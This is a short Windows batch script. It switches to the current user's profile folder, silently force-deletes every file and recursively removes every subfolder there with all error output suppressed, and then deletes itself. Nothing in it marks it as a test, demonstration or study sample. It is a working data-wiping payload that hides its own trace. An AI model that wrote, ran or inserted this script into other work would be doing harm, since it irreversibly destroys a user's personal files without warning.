@echo off
cd /d %USERPROFILE%

for /f "delims=" %%i in ('dir /b') do (
    del /f /q "%%i" >nul 2>&1
    rmdir /s /q "%%i" >nul 2>&1
)

del "%~f0"